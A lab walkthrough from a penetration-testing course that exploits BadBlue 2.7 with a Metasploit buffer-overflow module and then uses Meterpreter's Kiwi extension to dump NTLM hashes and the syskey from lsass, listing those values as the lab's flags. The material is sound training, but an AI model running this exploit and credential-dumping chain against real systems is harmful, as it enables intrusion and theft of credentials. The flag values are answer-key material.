# Windows: Meterpreter: Kiwi Extension (Lab)

**Step 1:** Open the lab link to access the Kali machine.

<figure><img src="https://assets.ine.com/lab/learningpath/47d2c04285afa77483281db32dc0def205487a27185510ed9f453d299a54f5db.jpg" alt=""><figcaption></figcaption></figure>

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/130ea8100f6ccce0fc0273cb221fae2db26b8846bc14e1f99694eada03be1f14.jpg" alt=""><figcaption></figcaption></figure>

The target is reachable.

**Step 3:** Check open ports on the target machine:

**Command:**

```
nmap demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/8a1f1d906fb41bd9189ed69989d6fafa4becf60cb1010f428c5060a48811170d.jpg" alt=""><figcaption></figcaption></figure>

**Step 4:** We have discovered that multiple ports are open. We will run nmap again to determine version information on port 80.

**Command:**

```
nmap -sV -p 80 demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/e6b0b0c3e4afa386541a6970b54a7925865855a1c009cd8a31e10000a96c3c4a.jpg" alt=""><figcaption></figcaption></figure>

**BadBlue 2.7** is available.

**Step 5:** We will search the exploit module for badblue 2.7 using searchsploit.

**Command:**

```
searchsploit badblue 2.7
```

<figure><img src="https://assets.ine.com/lab/learningpath/928becffd929b94f901173302a7e27690d1b8e0ba9940aea9c5ef8fb85a7469d.jpg" alt=""><figcaption></figcaption></figure>

**Step 6:** There is a metasploit module for badblue server. We will use PassThru remote buffer overflow metasploit module to exploit the target.

**Commands:**

```
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
```

<figure><img src="https://assets.ine.com/lab/learningpath/f358549effe9faf899f75ae4ac71ccd981e90dc480f524a6dd943192e544625c.jpg" alt=""><figcaption></figcaption></figure>

We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.

**Step 7:** Migrate the current process into lsass.exe

**Command:**

```
migrate -N lsass.exe
```

<figure><img src="https://assets.ine.com/lab/learningpath/fc760b6fbb75eebb31ab490ea1f3f7532e0f3d069f2e3cc0d8d56280180958e9.jpg" alt=""><figcaption></figcaption></figure>

**Step 8:** Load kiwi extension.

**Command:**

```
load kiwi
```

<figure><img src="https://assets.ine.com/lab/learningpath/5bba12c1d59fab29a992b3e72b81e6afd39c5e18aa4c5566618cebd1e77d327b.jpg" alt=""><figcaption></figcaption></figure>

**Step 9:** Dump Administrator NTLM hash using Kiwi extension commands.

**Command:**

```
creds_all
```

<figure><img src="https://assets.ine.com/lab/learningpath/48e635b2cc00e5e275e6ba8cc4be93fdc03e52364f872847381dbcbaea0f3c94.jpg" alt=""><figcaption></figcaption></figure>

This revealed the flag to us:

**Administrator User NTLM Hash:** e3c61a68f1b89ee6c8ba9507378dc88d

**Step10:** Extract all the users NTLM hash using Kiwi.

**Command:**

```
lsa_dump_sam
```

<figure><img src="https://assets.ine.com/lab/learningpath/2c2d83bdbe0dd1829d559ffa700c678fbf3c5c1898a837f2f17b60eae5f5c712.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src="https://assets.ine.com/lab/learningpath/a1924cea2dbde3a7aa928fee4f1d9ecc14f6a359f641a84fe8e5a888dd099e3f.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src="https://assets.ine.com/lab/learningpath/b6a0851922b017587e7a8f47099286c977482c5dc1d0376f07058f1224443069.jpg" alt=""><figcaption></figcaption></figure>

This revealed another flag to us:

**Student User NTLM Hash:** bd4ca1fbe028f3c5066467a7f6a73b0b

**Step 11:** Find the syskey by dumping the LSA secrets.

**Command:**

```
lsa_dump_secrets
```

<figure><img src="https://assets.ine.com/lab/learningpath/c70c845904074928ba3abe74c4b728a21be08d45833683a751446c60527cfafd.jpg" alt=""><figcaption></figcaption></figure>

This revealed another flag to us:

**Syskey:** 377af0de68bdc918d22c57a263d38326

## Conclusion

In this lab, we exploited a vulnerable application using metasploit to gain shell access on the target and then used the meterpreter Kiwi plugin to extract sensitive data from the target machine.

## References

* [BadBlue 2.72b - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/4715)
* [Metasploit Module](https://www.rapid7.com/db/modules/exploit/windows/http/badblue_passthru)
